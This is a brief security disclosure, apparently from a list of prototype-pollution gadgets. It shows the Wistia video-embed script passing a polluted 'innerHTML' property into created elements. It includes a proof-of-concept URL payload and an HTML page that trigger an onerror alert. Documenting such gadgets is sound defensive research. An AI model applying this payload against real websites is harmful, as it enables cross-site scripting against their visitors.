## Wistia Embedded Video

URL: https://wistia.com/support/embed-and-share/video-on-your-website

```js
if (this.chrome = r.elem.fromObject({
    id: r.seqId('wistia_chrome_'),
    class: 'w-chrome',
    style: r.generate.relativeBlockCss(),
    tabindex: -1
})
...
b = function e(t) {
  ...
  var i = t.tagName || 'div'
  ...
  var l = document.createElement(i);
  for (var s in t) {
    var d = t[s];
    if ('childNodes' != s && 'tagName' !== s && 'ref' !== s) {
    ...
    else
      'className' === s || 'class' === s ? l.className = d : 'innerHTML' === s ? l.innerHTML = d
```

### PoC
```
?__proto__[innerHTML]=<img/src/onerror=alert(1)>
```

```html
<script>
  Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';
</script>

<script src="https://fast.wistia.com/embed/medias/j38ihh83m5.jsonp" async></script>
<script src="https://fast.wistia.com/assets/external/E-v1.js" async></script>
<div class="wistia_embed wistia_async_j38ihh83m5"></div>
```